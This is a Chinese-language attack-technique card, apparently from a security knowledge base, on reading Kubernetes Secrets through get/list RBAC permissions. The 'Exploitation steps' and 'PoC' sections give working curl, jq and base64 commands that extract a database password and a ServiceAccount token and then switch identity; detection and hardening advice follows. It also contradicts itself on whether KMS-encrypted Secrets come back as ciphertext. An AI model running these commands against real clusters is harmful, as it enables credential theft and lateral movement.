---
id: cloud-k8s-k8s-rbac-secret-read
title: 利用 get/list secrets 权限读取 Secret 凭据横向移动
type: scenario
domain: cloud
path: cloud/k8s
technique: k8s-rbac-secret-read
aliases:
- K8s Secret 窃取
- ServiceAccount Token 读取
- base64 解码 Secret
- RBAC secrets 权限滥用
tags:
- kubernetes
- rbac
- secret
- credential
- serviceaccount
- lateral-movement
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-V5
  verified_at: '2026-11-04T21:42:33+08:00'
  notes: 已对照原文核对；Secret 仅 base64、get/list secrets 读取与 jq 解码/切换 SA token 命令均与原文一致；未本地复现
---

## 一句话结论

当 Pod 的 ServiceAccount 拥有 `get`/`list` secrets 权限时，攻击者可直接从 apiserver 拉取命名空间内所有 Secret，base64 解码即得数据库密码、API Key、TLS 私钥或另一个高权限 SA 的 Token，从而横向移动或切换身份。

## 原理

- Kubernetes Secret 默认只做 base64 编码，不是加密；任何能读取 Secret 对象的主体都能还原明文。
- Secret 常被用来存放数据库口令、对象存储密钥、镜像仓库凭据、TLS 证书私钥，以及 `kubernetes.io/service-account-token` 类型的长期 SA Token。
- RBAC 的 `get`/`list` 是对象级权限：一旦 SA 被授予 `secrets` 的读取权限，攻击者不需要节点权限或容器逃逸，直接通过 apiserver 就能拿到。
- 读取到其他 SA 的 Token 后，可以用该 Token 重新调用 apiserver，等于切换到那个 SA 的身份；如果目标 SA 权限更高，就形成二次提权。
- 读取范围取决于绑定的是 Role 还是 ClusterRole：命名空间 Role 只能读本命名空间，ClusterRole 可读所有命名空间。

## 触发条件

- 当前 SA 拥有 `get` 或 `list` `secrets` 权限（可通过 `SelfSubjectRulesReview` 确认）。
- apiserver 可达且 Token 有效。
- 目标命名空间内存在有价值的 Secret（数据库、云凭据、其他 SA Token）。
- 若 Secret 使用了 KMS/外部密钥管理加密，读取到的可能仍是密文，需要额外条件。

## 利用步骤

1. 枚举权限，确认 `secrets` 的 `get`/`list`。
2. 列出当前命名空间 Secret；若有集群级权限，列出所有命名空间。
3. 读取目标 Secret，检查 `type` 与 `data` 字段。
4. 对 `data` 中的每个值做 base64 解码，识别数据库口令、API Key、证书、Token。
5. 若发现 `kubernetes.io/service-account-token` 类型，提取其中的 `token` 字段，切换身份重新枚举权限。
6. 用拿到的凭据访问数据库、对象存储、镜像仓库或云 API，完成横向。

```bash
# 当前命名空间
curl --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$NAMESPACE/secrets

# 所有命名空间（需要集群级 list 权限）
curl --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/secrets
```

## PoC

```bash
# 读取指定 Secret
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$NAMESPACE/secrets/mysql-secret

# 提取并解码 password 字段
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$NAMESPACE/secrets/mysql-secret \
  | jq -r '.data.password' | base64 -d

# 提取 SA Token 并切换身份
NEW_TOKEN=$(curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$NAMESPACE/secrets/other-sa-token \
  | jq -r '.data.token' | base64 -d)
curl -s --cacert $CACERT -H "Authorization: Bearer $NEW_TOKEN" $APISERVER/api
```

## 变体与关联

- 集群级 `list secrets` 可一次性拉取所有命名空间，价值最高；命名空间级只能读当前范围。
- Secret 类型 `kubernetes.io/service-account-token` 直接给出 Token；`kubernetes.io/tls` 给出证书与私钥；`Opaque` 可能是任意业务凭据。
- 若 Secret 被 KMS 加密，API 返回的仍是明文（apiserver 解密后返回），除非使用了外部 Secret Store CSI 且未落盘到 etcd。
- 关联：`[[cloud-k8s-k8s-pod-sa-token-rbac-enumeration]]` 是前置枚举；`[[cloud-k8s-k8s-etcd-unauth]]` 是绕过 apiserver 直接读 Secret 的另一条路径；`[[cloud-k8s-k8s-rbac-clusterrolebinding-privesc]]` 是拿到高权限 SA 后的进一步提权。

## 检测与防御

- 检测：审计日志中 `get`/`list` `secrets` 的高频或批量请求，尤其是同一 SA 在短时间内遍历多个命名空间；关注从 Pod IP 发起的 Secret 读取。
- 检测：Secret 被读取后短时间内出现用其中凭据访问数据库/云 API 的行为（需结合外部日志）。
- 防御：RBAC 最小权限，默认不给业务 SA `secrets` 读权限；能用 `resourceNames` 限定的就不要给整个命名空间。
- 防御：启用 etcd 静态加密与 KMS；使用 External Secrets Operator/Vault 等外部密钥管理，减少 Secret 落盘。
- 加固：为 SA 使用 projected bound token 并缩短有效期；定期轮换数据库口令与 API Key；对高价值 Secret 设置访问审计与告警。
